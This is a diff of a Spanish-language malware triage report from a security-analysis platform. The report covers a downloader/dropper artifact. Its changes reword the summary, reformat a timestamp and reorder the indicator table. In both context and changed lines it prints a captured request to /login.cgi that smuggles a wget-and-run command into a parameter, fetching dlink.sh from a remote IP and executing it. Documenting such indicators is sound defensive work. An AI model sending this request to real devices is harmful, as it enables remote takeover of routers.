@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 225 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `dlink.sh` en `hxxp://196.251.121.XXX/a3f8d2/dlink.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:50:21+00:00`
+- **Registrado:** `2026-08-09T19:50:21.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,10 +54,10 @@ GET /login.cgi?cli=aa%20aa%27;wget%20http://196.251.121.XXX/a3f8d2/dlink.sh%20-O
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 196.251.121.XXX | static_analysis |
 | url | hxxp://196.251.121.XXX/a3f8d2/dlink.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ | strings |
-| hash | 75f9016a9f6bfc836a73e2d0a52b7d566d4b5c8d67777399804cda5828e80cd4 | static_analysis |
+| ip | 196.251.121.XXX | static_analysis |
 | command | GET /login.cgi?cli=aa%20aa%27;wget%20http://196.251.121.XXX/a3f8d2/dlink.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/ | strings |
+| hash | 75f9016a9f6bfc836a73e2d0a52b7d566d4b5c8d67777399804cda5828e80cd4 | static_analysis |
 | ip | 170.155.2.XXX | artifact_source |
 
 ## 🔎 Triage
